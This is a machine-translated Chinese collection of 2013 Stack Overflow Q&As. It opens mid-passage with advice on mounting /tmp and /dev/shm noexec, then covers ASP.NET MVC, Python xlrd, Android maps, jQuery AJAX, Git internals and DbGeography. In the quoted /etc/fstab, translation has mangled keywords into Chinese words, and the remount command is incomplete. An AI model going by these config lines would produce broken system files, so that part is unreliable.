要确保在每次重新启动后自动挂载此分区，请编辑 /etc/fstab 并将 /tmp 条目行替换为以下条目。/usr/temp-disk /tmp ext3 rw,noexec,nosuid,loop 0 0

[root@server ~]# pico -w /etc/fstab

您应该会看到如下内容： 代码：

```
/dev/hda3 / ext3 defaults,usrquota 1 1 
 /dev/hda1 /boot ext3 defaults 1 2    
 none /dev/pts devpts gid=5,mode=620 0 0    
 none /proc proc defaults 0 0    
 none /dev/shm tmpfs defaults 0 0    
 /dev/hda2 swap swap defaults 0 0 
```

在底部添加代码：

```
/usr/temp-disk /tmp ext3 rw,noexec,nosuid,loop 0 0 
```

当我们这样做时，我们将保护 /dev/shm。查找 /dev/shm 的挂载行并将其更改为以下内容：
none /dev/shm tmpfs noexec,nosuid 0 0

卸载并重新安装 /dev/shm 以使更改生效。

```
[root@server ~]# umount /dev/shm 
[root@server ~]# /dev/shm 
```

点击：Ctrl + x 退出，y 保存

* * *

**好吧，我也没有那么做。**

这是我的 etc/fstab：

/dev/sda1 / ext3 默认值,usrquota,grpquota 1 1
无 /dev/pts devpts gid=5,mode=620 0 0
无 /dev/shm tmpfs noexec,nosuid 0 0
无 /proc proc 默认值 0 0
无 /sys sysfs默认值 0 0
/dev/sda2 swap 交换默认值 0 0
/usr/tmpDSK /tmp ext3 loop,noexec,nosuid,rw 0 0
/tmp /var/tmp ext3 默认值,bind,noauto 0 0

我已经有了 /usr/tmpDSK 行，所以我只是用推荐的行替换了该行，而底部 /tmp 行保持不变。

现在一切都很好。我的 1G tmpDSK 已满 85%，现在已增加到 2G，只有 7% 满。

我也没有恢复我的 tmp 备份的内容（它太满了 crudd）。最好先检查一切是否正常 - 您可能在之前的 tmp 文件中有一些需要的东西。

# registry - 引导程序“无法读取注册表值”

> ID：15159236
> 
> 赞同：3
> 
> 时间：2013-03-01T13:44:16.353
> 
> 标签：registry, bootstrapper

在 boostrapper package.xml 我试图从注册表中读取 MSSQL 条目，例如：

```
<InstallChecks>
    <RegistryCheck Property="CheckSQLInstalled" Key="HKLM\SOFTWARE\Microsoft\Microsoft SQL Server" Value="SsrpActiveServer" />
</InstallChecks> 
```

运行结果 setup.exe 后，我进入日志：

*“读取注册表项 'HKLM\SOFTWARE\Microsoft\Microsoft SQL Server' 的值 'SsrpActiveServer' 无法读取注册表值 未设置属性 'CheckSQLInstalled' 的值”*

我以管理员身份运行它。UAC 也关闭了...注册表中的路径是正确的。我什至可以使用 BAT 文件检索它，例如：Reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server" /v SsrpActiveServer

问题发生在不止一台机器上。有任何想法吗？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-10-02T05:56:42.040

Setup.exe 将作为 32 位进程运行，因此在 64 位 PC 上它将读取

> HKLM\SOFTWARE\Wow6432Node\Microsoft\Microsoft SQL Server

该位置不存在 SsrpActiveServer 值。

# c# - 单击 HTML 按钮（不是提交或表单的发布按钮）Asp.net MVC 调用控制器的特定操作

> ID：15159244
> 
> 赞同：8
> 
> 时间：2013-03-01T13:44:46.097
> 
> 标签：c#, asp.net, asp.net-mvc, asp.net-mvc-3, asp.net-mvc-4

当我们单击表单的提交按钮时，将调用具有 HTTPPost 属性的控制器的操作，但是如果我想在单击普通 HTML 按钮时调用或执行操作怎么办 虽然以下文章

[http://www.codeproject.com/Tips/198477/Calling-a-MVC-Controller-and-Action-Method-using-H](http://www.codeproject.com/Tips/198477/Calling-a-MVC-Controller-and-Action-Method-using-H)

[调用 MVC 控制器和操作方法的 HTML 按钮](https://stackoverflow.com/questions/2503923/html-button-calling-a-mvc-controller-and-action-method)

告诉方法，但是这两个都在视图中使用控制器名称，因此视图必须了解控制器，我正在寻找视图不必了解控制器的答案。因为视图必须独立于控制器，视图不应该知道控制器所以，如果你知道答案，请回复

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-03-01T13:54:27.973

将您的用户定向到由创建的 url 的任何形式

```
<a href='@Url.Action("{action}", "{controller}")'> click me </a> 
```

或者

```
@using(BeginForm("{action}", "{controller}") 
```

会做你想做的。

这可以与

*   形式
*   按钮链接

重要的是目的地。视图对动作或控制器一无所知。帮手可以。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T13:55:21.047

要从客户端（即从视图）执行 MVC 操作，您需要点击一个 URL（使用任何动词：get、post、put 等）。因此，要从视图执行操作，您需要知道该操作的 URL，默认情况下，该 URL 直接映射到该操作，`controllername/actionname`但如果您想在视图和控制器之间创建更多抽象，您可以重新定义它。

鉴于此，您的按钮只需要链接到 URL 或链接到 js 即可执行 Ajax http 请求。

希望有帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T13:59:05.243

您不能在同一个控制器上具有相同名称和相同 HTTP 动词的 2 个操作。所以你问的没有意义。您可以调用与呈现视图的控制器操作相同的控制器操作，而无需指定操作和控制器名称。`Html.BeginForm()`无需指定操作和控制器名称即可工作的原因是表单正在向服务器发送 POST 请求，您可以区分这 2 个操作。

# asp.net - 有没有办法可以避免在使用枚举时添加 System.ComponentModel namspace？

> ID：15159247
> 
> 赞同：0
> 
> 时间：2013-03-01T13:44:57.877
> 
> 标签：asp.net, enums

我有一个扩展方法，允许我向我的枚举添加一个 Description 属性。

一个典型的枚举如下所示：

```
public enum Legal
{
    [Description("INVALID!")]
    None = 0,
    [Description("general-terms")]
    General = 1,
    [Description("competition-terms")]
    Competition = 2,
    [Description("privacy-policy")]
    Privacy = 3,
    [Description("cookie-policy")]
    Cookies = 4
} 
```

使用枚举（并添加了它的命名空间）时，我仍然发现我需要在使用它的任何地方添加 System.ComponentModel 命名空间。有没有办法解决？

这是扩展方法：

```
 public static string Description(this Enum @this)
    {
        @this.ThrowNull("@this");

        var memInfo = @this.GetType().GetMember(@this.ToString());

        if (memInfo.IsNotNullOrEmpty())
        {
            var attribute = memInfo[0].GetCustomAttributes(typeof(DescriptionAttribute), false);

            if (attribute.IsNotNullOrEmpty())
                return ((DescriptionAttribute)attribute[0]).Description;
        }

        return null;
    } 
```

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T13:59:04.620

如果你需要使用描述属性，你必须引用它的命名空间。但是，我很少使用该属性。从 IMO 代码文档的角度来看，简单的智能感知 (XML) 注释可以正常工作。

```
[Flags]
public enum PetTypes
{
    /// <summary>An option for cats!</summary>
    Cats = 1,

    /// <summary>An option for dogs!</summary>
    Dogs = 2

    /// <summary>Bill Murray style</summary>
    MassHysteria = 3
} 
```

# asp.net-mvc - Jquery 组件不适用于 Telerik JQuery(false)

> ID：15159249
> 
> 赞同：0
> 
> 时间：2013-03-01T13:45:04.407
> 
> 标签：asp.net-mvc, telerik, jquery

我在我的页面中添加了一个[Telerik treeView](http://demos.telerik.com/aspnet-mvc/razor/treeview/clientsideapi)并注意到 treeview 没有扩展。我注意到在 _layout 文件中，我有一行

```
 @Html.Telerik().ScriptRegistrar().DefaultGroup(group => group.Combined(true).Compress(true)).OnDocumentReady(
                 @<text>
                     prettyPrint();
                 </text>).jQuery(false); 
```

我删除了`.jQuery(false)`这一行中的，树视图工作正常，但页面上使用 JQuery 的其他组件（如日期选择器）停止工作。我如何确保一切正常？

# python - Python try except 块不识别错误类型

> ID：15159253
> 
> 赞同：8
> 
> 时间：2013-03-01T13:45:26.033
> 
> 标签：python

我的脚本有以下行：

```
libro_dia = xlrd.open_workbook(file_contents = libro_dia) 
```

当`libro_dia`无效时，它会引发以下错误：

```
XLRDError: Unsupported format, or corrupt file: Expected BOF record; found '<!DOCTYP' 
```

我想处理这个错误，所以我写：

```
try:
    libro_dia = xlrd.open_workbook(file_contents = libro_dia)
except XLRDError:
    no_termina = False 
```

但它会引发以下错误：

```
NameError: name 'XLRDError' is not defined 
```

这是怎么回事？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-03-01T13:49:18.563

您没有导入 XLRDError。我不熟悉 xlrd，但类似：

```
from xlrd import XLRDError 
```

可能会奏效。或者，在处理时限定您的`Error`：

```
try:
    libro_dia = xlrd.open_workbook(file_contents = libro_dia)
except xlrd.XLRDError: #<-- Qualified error here
    no_termina = False 
```

以上假设您有以下导入：

```
import xlrd 
```

* * *

回应您的评论：

在 python 中有几种使用导入的方法。如果通过 using 导入`import xlrd`，则必须将该模块中的每个对象限定为 xlrd.SomeObject。另一种方法是使用 form `from xlrd import *`，这将允许您在没有其模块命名空间的情况下引用 XLRD 错误。不过，这是一个懒惰的坏主意，因为它可能导致命名空间冲突。如果您想在不限定错误的情况下引用错误，那么正确的做法是`from xlrd import XLRDError`，这将允许您说`except XLRDError`。阅读有关[Python 模块的更多信息](http://docs.python.org/2/tutorial/modules.html)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-01T13:46:18.063

`XLRDError`是一个自定义异常，必须像任何其他对象一样导入到您的命名空间。

`except xlrd.XLRDError`编辑：正如 Burhan Khalid 所指出的，如果您的模块中已经有，您可以将 except 块修改为`import xlrd`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-11-20T06:15:20.220

尝试使用

```
 xlrd.XLRDError as e and e.message should contain the error string 
```

样本：

```
 try:
            workbook = xlrd.open_workbook(sys.argv[1])
   except xlrd.XLRDError as e:
            print e.message
            sys.exit(-1) 
```

# android - 运行我的 android 程序时显示 IndexOutOfBoundsException

> ID：15159254
> 
> 赞同：0
> 
> 时间：2013-03-01T13:45:33.820
> 
> 标签：android, android-mapview, indexoutofboundsexception, runtimeexception

我正在做一个面向 Android 地图的项目。我写了一些代码来显示两个地方之间的方向，但它只适用于较低的 android 版本，如 2.0、2.2 等。它不适用于 Android 4.0 及更高版本。当我在 Android 4.0 中运行此代码时，它会显示一个`IndexOutOfBoundsException`.

**我的课**

```
import java.io.InputStream;
import java.util.ArrayList;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.protocol.BasicHttpContext;
import org.apache.http.protocol.HttpContext;
import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Point;
import android.os.Bundle;
import android.widget.Button;
import com.google.android.maps.GeoPoint;
import com.google.android.maps.MapActivity;
import com.google.android.maps.MapController;
import com.google.android.maps.MapView;
import com.google.android.maps.Overlay;

public class LocationActivity extends MapActivity {
        MapView mv;

        MapController mc;

        Button Save, Cancel;

        @Override
        protected void onCreate(Bundle savedInstanceState) {
                super.onCreate(savedInstanceState);
                setContentView(R.layout.map_places);
                MapView mv = (MapView)findViewById(R.id.mapView);
                mv.setBuiltInZoomControls(true);
                MapController mc = mv.getController();
                ArrayList<GeoPoint> all_geo_points = getDirections(10.154929, 76.390316, 10.015861, 76.341867);
                GeoPoint moveTo = all_geo_points.get(0);
                mc.animateTo(moveTo);
                mc.setZoom(12);
                mv.getOverlays().add(new MyOverlay(all_geo_points));
        }

        public class MyOverlay extends Overlay {
                private ArrayList<GeoPoint> all_geo_points;

                public MyOverlay(ArrayList<GeoPoint> allGeoPoints) {
                        super();
                        this.all_geo_points = allGeoPoints;
                }

                @Override
                public boolean draw(Canvas canvas, MapView mv, boolean shadow, long when) {
                        super.draw(canvas, mv, shadow);
                        drawPath(mv, canvas);
                        return true;
                }

                public void drawPath(MapView mv, Canvas canvas) {
                        int xPrev = -1, yPrev = -1, xNow = -1, yNow = -1;
                        Paint paint = new Paint();
                        paint.setColor(Color.BLUE);
                        paint.setStyle(Paint.Style.FILL_AND_STROKE);
                        paint.setStrokeWidth(4);
                        paint.setAlpha(100);
                        if (all_geo_points != null) for (int i = 0; i < all_geo_points.size() - 4; i++) {
                                GeoPoint gp = all_geo_points.get(i);
                                Point point = new Point();
                                mv.getProjection().toPixels(gp, point);
                                xNow = point.x;
                                yNow = point.y;
                                if (xPrev != -1) {
                                        canvas.drawLine(xPrev, yPrev, xNow, yNow, paint);
                                }
                                xPrev = xNow;
                                yPrev = yNow;
                        }
                }
        }

        public static ArrayList<GeoPoint> getDirections(double lat1, double lon1, double lat2, double lon2) {
                String url = "http://maps.googleapis.com/maps/api/directions/xml?origin=" + lat1 + "," + lon1 + "&destination=" + lat2 + "," + lon2
                                + "&sensor=false&units=metric";
                String tag[] = {"lat", "lng"};
                ArrayList<GeoPoint> list_of_geopoints = new ArrayList<GeoPoint>();
                HttpResponse response = null;
                try {
                        HttpClient httpClient = new DefaultHttpClient();
                        HttpContext localContext = new BasicHttpContext();
                        HttpPost httpPost = new HttpPost(url);
                        response = httpClient.execute(httpPost, localContext);
                        InputStream in = response.getEntity().getContent();
                        DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
                        Document doc = builder.parse(in);
                        if (doc != null) {
                                NodeList nl1, nl2;
                                nl1 = doc.getElementsByTagName(tag[0]);
                                nl2 = doc.getElementsByTagName(tag[1]);
                                if (nl1.getLength() > 0) {
                                        list_of_geopoints = new ArrayList<GeoPoint>();
                                        for (int i = 0; i < nl1.getLength(); i++) {
                                                Node node1 = nl1.item(i);
                                                Node node2 = nl2.item(i);
                                                double lat = Double.parseDouble(node1.getTextContent());
                                                double lng = Double.parseDouble(node2.getTextContent());
                                                list_of_geopoints.add(new GeoPoint((int) (lat * 1E6), (int) (lng * 1E6)));
                                        }
                                } else {
                                        // No points found
                                }
                        }
                } catch (Exception e) {
                        e.printStackTrace();
                }
                return list_of_geopoints;
        }

        @Override
        protected boolean isRouteDisplayed() {
                // TODO Auto-generated method stub
                return true;
        }
} 
```

**我的日志猫**

```
03-01 19:05:19.180: E/AndroidRuntime(2839): FATAL EXCEPTION: main
03-01 19:05:19.180: E/AndroidRuntime(2839): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.kodspider.parkon/com.kodspider.parkon.LocationActivity}: java.lang.IndexOutOfBoundsException: Invalid index 0, size is 0
03-01 19:05:19.180: E/AndroidRuntime(2839):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2059)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at android.app.ActivityThread.startActivityNow(ActivityThread.java:1900)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at android.app.LocalActivityManager.moveToState(LocalActivityManager.java:135)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at android.app.LocalActivityManager.startActivity(LocalActivityManager.java:347)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at android.widget.TabHost$IntentContentStrategy.getContentView(TabHost.java:694)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at android.widget.TabHost.setCurrentTab(TabHost.java:358)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at android.widget.TabHost$2.onTabSelectionChanged(TabHost.java:150)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at android.widget.TabWidget$TabClickListener.onClick(TabWidget.java:546)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at android.view.View.performClick(View.java:4084)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at android.view.View$PerformClick.run(View.java:16966)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at android.os.Handler.handleCallback(Handler.java:615)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at android.os.Handler.dispatchMessage(Handler.java:92)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at android.os.Looper.loop(Looper.java:137)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at android.app.ActivityThread.main(ActivityThread.java:4745)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at java.lang.reflect.Method.invokeNative(Native Method)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at java.lang.reflect.Method.invoke(Method.java:511)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at dalvik.system.NativeStart.main(Native Method)
03-01 19:05:19.180: E/AndroidRuntime(2839): Caused by: java.lang.IndexOutOfBoundsException: Invalid index 0, size is 0
03-01 19:05:19.180: E/AndroidRuntime(2839):     at java.util.ArrayList.throwIndexOutOfBoundsException(ArrayList.java:251)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at java.util.ArrayList.get(ArrayList.java:304)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at com.kodspider.parkon.LocationActivity.onCreate(LocationActivity.java:43)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at android.app.Activity.performCreate(Activity.java:5008)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1079)
03-01 19:05:19.180: E/AndroidRuntime(2839):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2023)
03-01 19:05:19.180: E/AndroidRuntime(2839):     ... 18 more 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T13:49:26.783

因此，基本上，getDirections() 返回一个空的 ArrayList，然后您尝试访问它的第一项。

试着理解为什么你的方法返回一个空集并修复它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T13:51:03.573

您在 com.kodspider.parkon.LocationActivity.onCreate(LocationActivity.java:43) 遇到了异常

我假设它是以下代码行：

```
ArrayList<GeoPoint> all_geo_points = getDirections(10.154929, 76.390316, 10.015861, 76.341867);
GeoPoint moveTo = all_geo_points.get(0); 
```

所以方法 getDirections 返回一个空数组。尝试：

```
 if(all_geo_points.size()>0){
    GeoPoint moveTo = all_geo_points.get(0);
    mc.animateTo(moveTo);
    mc.setZoom(12);
    mv.getOverlays().add(new MyOverlay(all_geo_points));
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-30T11:12:03.473

使用下面的代码...

```
public static JSONObject getLocationInfo(String origin, String dest) {

StringBuilder stringBuilder = new StringBuilder();

try {
        origin = origin.replaceAll(" ", "%20");
        dest = dest.replaceAll(" ", "%20");

        HttpPost httppost = new HttpPost(
                "http://maps.googleapis.com/maps/api/directions/json?origin="
                        + origin + "&destination=" + dest + "&sensor=false");
        // http://maps.googleapis.com/maps/api/directions/json?origin=Chicago,IL&destination=Los+Angeles,CA&sensor=false

        Log.i("httppost",
                "http://maps.googleapis.com/maps/api/directions/json?origin="
                        + origin + "&destination=" + dest + "&sensor=false");

        HttpClient client = new DefaultHttpClient();
        HttpResponse response;
        stringBuilder = new StringBuilder();

        response = client.execute(httppost);
        HttpEntity entity = response.getEntity();
        InputStream stream = entity.getContent();
        int b;
        while ((b = stream.read()) != -1) {
            stringBuilder.append((char) b);
        }
    } catch (ClientProtocolException e) {

        Log.i("Ex1", e.getMessage());

    } catch (IOException e) {
        Log.i("Ex2", e.getMessage());
    }

    JSONObject jsonObject = new JSONObject();
    try {
        jsonObject = new JSONObject(stringBuilder.toString());

        Log.i("JSON Length", "" + jsonObject.length());
    } catch (JSONException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

    return jsonObject;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T16:05:04.090

我找到了关于更高版本的 android 平台的问题的答案，我们必须为后台线程使用 AsyncTask 类

# php - 使用 jquery 和 ajax php 传递变量

> ID：15159255
> 
> 赞同：0
> 
> 时间：2013-03-01T13:45:35.567
> 
> 标签：php, ajax, jquery

我正在关注本教程，所以我的问题是：我这里有这段代码，它是一些表格。

```
<tr id="<?php echo $id; ?>" class="edit_tr">

<td class="edit_td">
<span id="first_<?php echo $id; ?>" class="text"><?php echo $kodi; ?></span>
<input type="text" value="<?php echo $kodi; ?>" class="editbox" id="first_input_<?php echo $id; ?>" /&gt;
</td>

<td class="edit_td">
<span id="last_<?php echo $id; ?>" class="text"><?php echo $vlera; ?></span>
<input type="text" value="<?php echo $vlera; ?>" class="editbox" id="last_input_<?php echo $id; ?>"/>
</td>

</tr> 
```

现在，这是脚本：

```
<script type="text/javascript">
$(document).ready(function()
{
$(".edit_tr").click(function()
{
var ID=$(this).attr('id');
$("#first_"+ID).hide();
$("#last_"+ID).hide();
$("#first_input_"+ID).show();
$("#last_input_"+ID).show();
}).change(function()
{
var ID=$(this).attr('id');
var kodi=$("#first_input_"+ID).val();
var vlera=$("#last_input_"+ID).val();
var dataString = 'id='+ ID +'&kodi='+kodi+'&vlera='+vlera;
$("#first_"+ID).html('<img src="load.gif" />'); // Loading image

if(first.length>0&& last.length>0)
{

$.ajax({
type: "POST",
url: "table_edit_ajax.php",
data: dataString,
cache: false,
success: function(html)
{
$("#first_"+ID).html(first);
$("#last_"+ID).html(last); 
```

我可能没有正确传递变量..因为它不会保存它们，所以查询不会执行。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T13:48:15.977

jQuery 在 ajax 中传递表单字段的最简单方法是使用[`serialize`](http://api.jquery.com/serialize/)：

```
data: $("form").serialize(); 
```

另一个问题是您使用了两个变量，`first`但`last`您没有在任何地方定义它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:37:40.383

试试这个代码：

```
$(function() { // This makes the same than $(document).ready();
    $(".edit_tr").each(function() { // Instead of assign the click event, we loop through each element
        var $element = $(this);
        var id = this.id;
        var $first = $('#first_' + id);
        var $last = $('#last_' + id);
        var $firstInput = $('#first_input_' + id);
        var $lastInput = $('#last_input_' + id);
        $element.click(function() {
            $first.hide();$last.hide();
            $firstInput.show();$lastInput.show();
        }).change(function() {
            $first.html('<img src="load.gif" />');
            // Here you have an if, but those elements are not defined in the script...
            // if (first.length > 0 && last.length > 0) {
            $.post("table_edit_ajax.php", {
                id : id,
                kodi : $firstInput.val(),
                vlera : $lastInput.val()
            }, function(html) {
                // Here again the two vars not defined
                //$first.html(first);
                //$last.html(last);
            });
            // }
        });
    });
}); 
```

# python - 在python中下载文件并取消

> ID：15159262
> 
> 赞同：5
> 
> 时间：2013-03-01T13:46:06.677
> 
> 标签：python, download

我正在尝试制作一个简单的函数来在 python 中下载文件代码类似于

```
def download(url , dest):
    urllib.urlretrieve(url, dest) 
```

我的问题是，如果我想在下载过程中取消下载过程，我该怎么办？？？

该功能在app后台运行，由按钮触发。现在我试图用另一个按钮来触发它。

该平台是XBMC。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T22:00:41.723

`download`一个简单的类与您的函数执行相同的操作：

```
import urllib
import threading

class Downloader:

    def __init__(self):
        self.stop_down = False
        self.thread = None

    def download(self, url, destination):
        self.thread = threading.Thread(target=self.__down, args=(url, destination))
        self.thread.start()

    def __down(self, url, dest):
        _continue = True
        handler = urllib.urlopen(url)
        self.fp = open(dest, "w")
        while not self.stop_down and _continue:
            data = handler.read(4096)
            self.fp.write(data)
            _continue = data
        handler.close()
        self.fp.close()

    def cancel(self):
        self.stop_down = True 
```

因此，当有人单击“取消”按钮时，您必须调用该`cancel()`方法。

请注意，如果您取消它，这不会删除部分下载的文件，但使用`os.unlink()`.

以下示例脚本显示了如何使用它，开始下载一个 ~20Mb 文件并在 5 秒后取消它：

```
import time
if __name__ == "__main__":
    url = "http://ftp.postgresql.org/pub/source/v9.2.3/postgresql-9.2.3.tar.gz"
    down = Downloader()
    down.download(url, "file")
    print "Download started..."
    time.sleep(5)
    down.cancel()
    print "Download canceled" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T22:19:11.130

如果您通过按 CTRL+C 取消，那么您可以使用此内置异常并继续您认为最好的操作。

在这种情况下，如果我在下载过程中取消，我只想删除该部分文件：

```
def download(url , dest):
    try:
        urllib.urlretrieve(url, dest)
    except KeyboardInterrupt:
        if os.path.exists(dest):
            os.remove(dest)
    except Exception, e:
        raise 
```

# git - Git本地更改历史记录在硬盘上的位置

> ID：15159264
> 
> 赞同：3
> 
> 时间：2013-03-01T13:46:07.700
> 
> 标签：git

我是 Git 新手。我正在使用 Git 扩展，我想问一下我是否进行了一些更改并在本地提交它但还没有推送它。我的本地历史存储在哪里？？？我有从服务器克隆存储库的目录。那是存储我的本地提交历史记录的位置还是存储在 C 驱动器中的任何位置？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T13:47:29.987

Git 将其所有内部数据存储在隐藏文件夹`.git`中。它位于项目结帐的根目录中。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-01T14:56:47.597

默认情况下，克隆存储库时，克隆会创建一个工作目录，其中自动签出默认分支。在这个工作目录的根文件夹中有一个隐藏文件夹；`.git`. 该`.git`文件夹是存储库的本地副本，包含所有内容。

更具体地说，在该`.git`文件夹中，有一些对此问题感兴趣的文件夹。

对于每个本地分支，路径中都有文件`.git/refs/heads`。例如，如果您有默认`master`分支，则在`.git/refs/heads/master`. 此文件包含该分支上最新提交的提交号。

提交的数据存储在文件`.git/objects`夹中的文件中；在提交哈希的前两位数字的文件夹和哈希的剩余数字的文件中。例如，在我当前正在处理的存储库中，`master`文件包含提交哈希`a50eed54467b98094438a22ae52995901c9a7ac9`。该提交的数据位于`.git/objects/a5/0eed54467b98094438a22ae52995901c9a7ac9`文件中。

所以这些文件在我的存储库中通常很小，因为数据只是与父提交的压缩差异。该文件中包含的数据正是该提交中更改的内容 - 不是所有内容。

远程分支所在的提交存储在不同的位置。远程分支位于文件夹中`.git/refs/remotes/<remote name>/<branch name>`——与本地分支的存储方式非常相似。当推送时，**远程存储库中**的本地分支被更新——当一个分支被获取时，这个文件夹中的远程分支文件被更新。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T13:47:50.860

您的**本地**git 存储库存储在存储库`.git`目录中的文件中。

# entity-framework - 从 DbGeography 点的集合创建 DbGeography 多边形

> ID：15159265
> 
> 赞同：4
> 
> 时间：2013-03-01T13:46:11.137
> 
> 标签：entity-framework, geospatial

谁能告诉我如何从“POINT”类型的 DbGeography 对象集合中创建“多边形”类型的 DbGeography 对象

到目前为止，我已经得到了这个创建多边形的方法，但我错过了初始步骤。

```
1\. DbGeography multipoint = DbGeography.MultiPointFromText("MULTIPOINT(53.095124 -0.864716, 53.021255 -1.337128, 52.808019 -1.345367, 52.86153 -1.018524)", 4326)

2\. DbGeometry temp_multipoint = DbGeometry.MultiPointFromBinary(multipoint.AsBinary(), 4326)

3\. DbGeography polygon = DbGeography.PolygonFromBinary(temp_multipoint.ConvexHull.AsBinary(), 4326); (RESULT) 
```

问题是从 DbGeography(POINTS) 列表创建初始多点地理对象

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-25T14:46:06.767

使用 WKT 将每个点创建为 DbGeography 对象：

```
DbGeography point1 = DbGeography.FromText("POINT(53.095124 -0.864716)", 4326);
DbGeography point2 = DbGeography.FromText("POINT(53.021255 -1.337128)", 4326);
DbGeography point3 = DbGeography.FromText("POINT(52.808019 -1.345367)", 4326);
...
DbGeography polygon = DbGeography.PolygonFromText("POLYGON((53.095124 -0.864716, 53.021255 -1.337128, 52.808019 -1.345367, 53.095124 -0.864716))", 4326); 
```

有两点需要注意：

*   WKT 格式是经度然后纬度，而不是更直观的纬度，经度
*   对于多边形，LAST 点必须与 FIRST 点匹配才能“将其关闭”

希望这会有所帮助——我也在努力学习多边形的东西！

有关 WKT 格式的额外提示，请参阅本文：[http ://en.wikipedia.org/wiki/Well-known_text](http://en.wikipedia.org/wiki/Well-known_text)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-09-23T23:39:37.620

我最终确实找到了如何从多个点创建一个多边形，而不必从 WKT 创建它。下面的解释略有简化，但仍然

```
 var PolygonFromMultiplePoints = new DbGeography();

    using (var db = new LocationContext())
    {
        //Select Locations known to be within a certain area which should define the polygon.
        foreach (var item in db.Locations)
        {
            PolygonFromMultiplePoints.Union(item.GeoLocation);
        }
    }            
    var temp_multipointgeometry = DbGeometry.MultiPointFromBinary(PolygonFromMultiplePoints.AsBinary(), DbGeometry.DefaultCoordinateSystemId);            
    PolygonFromMultiplePoints = DbGeography.PolygonFromBinary(temp_multipointgeometry.ConvexHull.AsBinary(), DbGeography.DefaultCoordinateSystemId); 
```

代码示例假定您已经有一个 dbgeography 集合作为点存储在数据库中。我的数据库信息来自从 GeoNames 导入位置。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-09-22T04:48:01.127

您真的应该在 C# 中执行此操作，以迭代方式添加点，原因如下：

*   您需要确保结束位置与开始位置相同。
*   由于环方向，您需要确保顺时针添加点。您可以翻转圆环并逆时针旋转 (sqlGeography.ReorientObject();)。

您正在处理空间数据，但复杂形状的构造从来都不适用于 T-SQL。最坏的情况是把它放在 CLR 函数中。

# asp.net-mvc-4 - mvc4 区域多路由

> ID：15159266
> 
> 赞同：0
> 
> 时间：2013-03-01T13:46:15.840
> 
> 标签：asp.net-mvc-4, asp.net-mvc-areas

我在 MVC4 中有一个网站，在名为“HomeController”的控制器内有一个“admin”区域，在我的项目中还有一个文件夹控制器，其控制器名为“HomeController”：当我调用

```
public ActionResult LogOff()
{
    FormsAuthentication.SignOut();
    return RedirectToAction("Index", "Home");
} 
```

我收到错误：找到了与名为“Home”的控制器匹配的多种类型。如果为该请求提供服务的路由 ('{controller}/{action}/{id}') 未指定命名空间来搜索与请求匹配的控制器，则可能会发生这种情况。如果是这种情况，请通过调用采用“namespaces”参数的“MapRoute”方法的重载来注册此路由。

'Home' 的请求找到了以下匹配的控制器：site1.co.il.Controllers.HomeController site1.co.il.Areas.Admin.Controllers.HomeController

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T15:52:38.350

如果你在不同的区域有相同的控制器和动作，MVC4 没有办法选择其中之一，除非你指定哪个是想要的路由。

您可以像这样指定它：

